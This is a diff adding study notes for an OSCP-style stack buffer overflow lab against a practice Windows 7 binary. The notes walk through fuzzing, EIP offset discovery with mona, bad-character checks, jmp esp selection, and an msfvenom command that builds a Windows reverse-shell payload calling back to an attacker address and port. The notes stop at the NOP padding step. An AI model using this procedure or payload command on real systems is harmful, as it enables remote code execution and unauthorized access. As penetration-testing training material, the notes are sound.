@@ -1,0 +1,60 @@
+Machine: 32-bit Windows 7 VM
+Focus: stack based buffer overflows (the type taught on the PWK/OSCP course)
+help: https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
+
+Steps:
+1. Open your binary in the immunity debugger as a admin.
+2. from the attack box, access the binary app using
+> nc 10.10.76.111 1337
+3. To set a working folder in mona, type:
+> !mona config -set workingfolder c:\mona\%p
+4. Fuzzing
+Run fizzer.py.
+The fuzzer will send increasingly long strings comprised of A's. 
+If the fuzzer crashes the server with one of the strings, 
+the fuzzer should exit with an error message. Make a note of the 
+largest number of bytes that were sent.
+
+You will notice that after sending certain bytes, the app get crashed.
+
+5. Controlling the EIP 
+- create exploit.py
+- Run the following command to generate a cyclic pattern of a length 
+400 bytes longer that the string that crashed the server 
+(change the -l value to this):
+> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700
+- Copy the output and place it into the payload variable of the exploit.py script.
+- run exploit.py which will crash the application.
+- run this in mona to find the offset:
+> !mona findmsp -distance 1700
+look for "EIP contains normal pattern : ... (offset XXXX)"
+- Update your exploit.py script and set the offset variable to this value (
+was previously set to 0). Set the payload variable to an empty string again. 
+Set the retn variable to "BBBB".
+- after running the exploit script, The EIP register should 
+now be overwritten with the 4 B's (e.g. 42424242).
+6. Finding Bad Characters
+use badchar.py
+add that to the payload and find the badchars in them.
+7. Finding a Jump Point
+Use > !mona jmp -r esp -cpb "\x00\x03(all the badchars)"
+- This command finds all "jmp esp" (or equivalent) instructions with 
+addresses that don't contain any of the badchars specified. The results 
+should display in the "Log data" window (use the Window menu to switch to it 
+if needed).
+- Choose an address and update your exploit.py script, setting the "retn" variable 
+to the address, written backwards (since the system is little endian). 
+For example if the address is \x01\x02\x03\x04 in Immunity, 
+write it as \x04\x03\x02\x01 in your exploit.
+8. Generate payload
+Use > msfvenom -p windows/shell_reverse_tcp LHOST=10.10.33.154 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+- Copy the generated C code strings and integrate them into your exploit.py script payload variable
+9. Prepend NOPs
+padding = "\x90" * 16
+
+
+
+
+
+
+
